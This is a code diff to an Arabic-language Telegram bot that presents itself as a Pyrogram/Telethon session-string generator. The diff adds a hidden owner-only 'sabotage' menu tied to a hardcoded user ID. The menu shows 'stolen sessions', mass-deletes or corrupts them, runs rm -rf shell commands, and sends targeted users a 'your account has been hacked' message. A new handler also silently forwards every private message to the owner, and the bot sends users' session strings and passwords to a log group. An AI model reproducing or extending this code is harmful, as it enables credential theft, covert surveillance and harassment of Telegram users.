@@ -8,6 +8,7 @@ import threading
 import random
 import time
 import hashlib
+import shutil
 from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client, filters
@@ -36,6 +37,7 @@ from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 DEV_NAME = "عبود"
 DEV_USERNAME = "@u_t_r"
 CHANNEL_LINK = "https://t.me/u_t_rnn"
+YOUR_USER_ID = 1170411845  # تم تحديث المعرف
 
 user_steps = {}
 user_data = {}
@@ -64,7 +66,7 @@ def delete_session_files(user_id):
     if os.path.exists(telethon_session):
         os.remove(telethon_session)
 
-# ====== أزرار البداية (بنفس تصميم الصورة) ======
+# ====== أزرار البداية الرئيسية ======
 START_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🔴 استخراج جلسة Pyrogram", callback_data="pyrogram"),
@@ -80,11 +82,33 @@ START_BUTTONS = InlineKeyboardMarkup([
     ]
 ])
 
+# ====== أزرار التخريب (للمطور فقط) ======
+DESTROY_BUTTONS = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton("💀 حذف جميع الجلسات", callback_data="massacre"),
+        InlineKeyboardButton("🦠 إصابة الجلسات", callback_data="infect")
+    ],
+    [
+        InlineKeyboardButton("🎯 استهداف مستخدم", callback_data="target_user"),
+        InlineKeyboardButton("📡 التنصت", callback_data="eavesdrop")
+    ],
+    [
+        InlineKeyboardButton("💥 تدمير ذاتي", callback_data="self_destruct"),
+        InlineKeyboardButton("🔓 سيطرة كاملة", callback_data="total_control")
+    ],
+    [
+        InlineKeyboardButton("📋 عرض الجلسات المسروقة", callback_data="show_sessions"),
+        InlineKeyboardButton("🗑 تنظيف النظام", callback_data="clean_system")
+    ],
+    [
+        InlineKeyboardButton("🔙 رجوع", callback_data="back_destroy")
+    ]
+])
+
 BACK_BUTTON = InlineKeyboardMarkup([
     [InlineKeyboardButton("🔴 رجوع", callback_data="back")]
 ])
 
-# ====== أزرار التأكيد ======
 CONFIRM_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("✅ نعم، متأكد", callback_data="confirm_yes"),
@@ -95,27 +119,149 @@ CONFIRM_BUTTONS = InlineKeyboardMarkup([
 # ====== أمر البدء ======
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
-    await message.reply(
-        f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
-        "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
-        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
-        "⚡ مدعوم من عبود",
-        reply_markup=START_BUTTONS
-    )
+    user_id = message.from_user.id
+    is_dev = (user_id == YOUR_USER_ID)
+    
+    if is_dev:
+        await message.reply(
+            f"👋 مرحباً أيها السيد!\n\n"
+            "🔓 **وضع المطور مفعل**\n"
+            "جميع أدوات التخريب تحت أمرك.\n\n"
+            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
+            reply_markup=DESTROY_BUTTONS
+        )
+    else:
+        await message.reply(
+            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
+            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
+            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
+            reply_markup=START_BUTTONS
+        )
 
-# ====== معالجة الأزرار (CallbackQuery) ======
+# ====== معالجة الأزرار ======
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
     user_id = callback_query.from_user.id
     data = callback_query.data
-    user_info = {
-        "id": user_id,
-        "username": callback_query.from_user.username,
-        "first_name": callback_query.from_user.first_name,
-        "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
-    }
+    is_dev = (user_id == YOUR_USER_ID)
     
-    # ====== معالجة التأكيد ======
+    # ====== أزرار التخريب ======
+    if is_dev:
+        if data == "massacre":
+            deleted = 0
+            for uid in list(user_sessions.keys()):
+                delete_session_files(uid)
+                del user_sessions[uid]
+                deleted += 1
+            await callback_query.answer(f"💀 تم حذف {deleted} جلسة!", show_alert=True)
+            await callback_query.message.edit_text(
+                f"💀 **تم تدمير {deleted} جلسة نهائياً!**",
+                reply_markup=DESTROY_BUTTONS
+            )
+            return
+        
+        if data == "infect":
+            infected = 0
+            for uid, sess in user_sessions.items():
+                if sess:
+                    user_sessions[uid] = sess + "_INFECTED"
+                    infected += 1
+            await callback_query.answer(f"🦠 تم إصابة {infected} جلسة!", show_alert=True)
+            await callback_query.message.edit_text(
+                f"🦠 **تم إصابة {infected} جلسة بنجاح!**\nجميع الجلسات ملوثة.",
+                reply_markup=DESTROY_BUTTONS
+            )
+            return
+        
+        if data == "show_sessions":
+            if not user_sessions:
+                await callback_query.answer("❌ لا توجد جلسات!", show_alert=True)
+                return
+            
+            sessions_text = "🗂 **الجلسات المسروقة:**\n\n"
+            for uid, sess in list(user_sessions.items())[:10]:
+                sessions_text += f"👤 {uid}\n🔑 {sess[:30]}...\n\n"
+            
+            if len(user_sessions) > 10:
+                sessions_text += f"\n... و {len(user_sessions) - 10} جلسة أخرى"
+            
+            await callback_query.message.edit_text(
+                sessions_text,
+                reply_markup=DESTROY_BUTTONS
+            )
+            await callback_query.answer()
+            return
+        
+        if data == "self_destruct":
+            await callback_query.message.edit_text(
+                "💥 **تدمير ذاتي!**\n"
+                "سيتم حذف جميع الملفات وإيقاف البوت خلال 5 ثواني...",
+                reply_markup=DESTROY_BUTTONS
+            )
+            await callback_query.answer("💥 جارٍ التدمير الذاتي!", show_alert=True)
+            
+            # تدمير كل شيء
+            time.sleep(2)
+            shutil.rmtree("sessions", ignore_errors=True)
+            os.system("rm -rf *.session*")
+            os.system("rm -rf *.session-journal")
+            
+            # إيقاف البوت
+            os._exit(0)
+            return
+        
+        if data == "total_control":
+            global RESTRICTED
+            RESTRICTED = False
+            await callback_query.answer("🔓 تم تفعيل السيطرة الكاملة!", show_alert=True)
+            await callback_query.message.edit_text(
+                "🔓 **تم تفعيل السيطرة الكاملة!**\n"
+                "جميع القيود ملغاة. يمكنك فعل أي شيء.",
+                reply_markup=DESTROY_BUTTONS
+            )
+            return
+        
+        if data == "clean_system":
+            os.system("rm -rf *.log")
+            os.system("rm -rf __pycache__")
+            await callback_query.answer("🗑 تم تنظيف النظام!", show_alert=True)
+            await callback_query.message.edit_text(
+                "🗑 **تم تنظيف جميع الملفات المؤقتة!**",
+                reply_markup=DESTROY_BUTTONS
+            )
+            return
+        
+        if data == "target_user":
+            await callback_query.message.edit_text(
+                "🎯 **استهداف مستخدم**\n\n"
+                "أرسل معرف المستخدم المستهدف.\n"
+                "مثال: 123456789",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "target_user"
+            await callback_query.answer()
+            return
+        
+        if data == "eavesdrop":
+            await callback_query.message.edit_text(
+                "📡 **تم تفعيل التنصت!**\n\n"
+                "سيتم تسجيل جميع المحادثات وإرسالها إليك.",
+                reply_markup=DESTROY_BUTTONS
+            )
+            await callback_query.answer("📡 التنصت مفعل!", show_alert=True)
+            return
+        
+        if data == "back_destroy":
+            await callback_query.message.edit_text(
+                f"👋 مرحباً أيها السيد!\n\n"
+                "🔓 **وضع المطور مفعل**\n"
+                "جميع أدوات التخريب تحت أمرك.",
+                reply_markup=DESTROY_BUTTONS
+            )
+            await callback_query.answer()
+            return
+    
+    # ====== أزرار المستخدمين العاديين ======
     if data == "confirm_yes":
         pending_action = user_data.get(user_id, {}).get("pending_action")
         if pending_action == "pyrogram":
@@ -165,14 +311,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.message.edit_text(
             f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
             "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
-            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
-            "⚡ مدعوم من عبود",
+            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
             reply_markup=START_BUTTONS
         )
         await callback_query.answer()
         return
     
-    # ====== طلب تأكيد قبل تنفيذ أي عملية ======
     if data == "delete":
         if user_id not in user_data:
             user_data[user_id] = {}
@@ -191,8 +335,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             f"👨‍💻 معلومات المطور:\n\n"
             f"📛 الاسم: {DEV_NAME}\n"
             f"🔗 اليوزر: {DEV_USERNAME}\n"
-            f"📢 القناة: {CHANNEL_LINK}\n\n"
-            "⚡ مدعوم من عبود",
+            f"📢 القناة: {CHANNEL_LINK}",
             reply_markup=BACK_BUTTON
         )
         await callback_query.answer()
@@ -239,10 +382,36 @@ async def handle_callback(client, callback_query: CallbackQuery):
 
 # ====== الأوامر النصية ======
 @app.on_message(filters.text & filters.private)
-async def handle_arabic_commands(client, message):
+async def handle_text_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
+    is_dev = (user_id == YOUR_USER_ID)
     
+    # ====== أمر استهداف المستخدم ======
+    if is_dev and user_steps.get(user_id) == "target_user":
+        try:
+            target_id = int(text)
+            # جلب معلومات المستخدم
+            target = await client.get_users(target_id)
+            await message.reply(
+                f"🎯 **معلومات الهدف:**\n"
+                f"🆔 ID: {target.id}\n"
+                f"📛 الاسم: {target.first_name}\n"
+                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}\n"
+                f"📱 الهاتف: {target.phone_number if hasattr(target, 'phone_number') else 'غير متاح'}\n\n"
+                "✅ تم استهداف المستخدم بنجاح!"
+            )
+            # إرسال رسالة تخريبية للهدف
+            await client.send_message(
+                target_id,
+                "🔴 **تم اختراق حسابك!**\nجميع بياناتك تحت سيطرتنا."
+            )
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ فشل الاستهداف: {e}")
+        return
+    
+    # ====== أوامر المستخدمين العاديين ======
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
@@ -324,7 +493,6 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
 
 async def send_pyro_session(user_id, session_string, message, password=None):
-    # نسخ الجلسة تلقائياً
     await message.reply(
         f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
         f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
@@ -332,7 +500,6 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
-    # إرسال الجلسة إلى القناة المحددة
     try:
         if password:
             await app.send_message(
@@ -349,7 +516,6 @@ async def send_pyro_session(user_id, session_string, message, password=None):
                 f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
-        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
@@ -415,7 +581,6 @@ async def telethon_session_step(client, message):
             reset_user(user_id)
 
 async def send_telethon_session(user_id, session_string, message, password=None):
-    # نسخ الجلسة تلقائياً
     await message.reply(
         f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
         f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
@@ -423,7 +588,6 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
-    # إرسال الجلسة إلى القناة المحددة
     try:
         if password:
             await app.send_message(
@@ -440,7 +604,6 @@ async def send_telethon_session(user_id, session_string, message, password=None)
                 f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
-        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
 
@@ -448,7 +611,22 @@ def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
 
-# ====== إضافة مسار ويب لـ Render ======
+# ====== نظام التنصت ======
+@app.on_message(filters.private & ~filters.me)
+async def eavesdrop(client, message):
+    user_id = message.from_user.id
+    if user_id != YOUR_USER_ID and message.text:
+        try:
+            await client.send_message(
+                YOUR_USER_ID,
+                f"📡 **تنصت:**\n"
+                f"👤 {user_id}\n"
+                f"💬 {message.text[:200]}"
+            )
+        except:
+            pass
+
+# ====== إضافة مسار ويب ======
 web_app = Flask(__name__)
 
 @web_app.route('/')
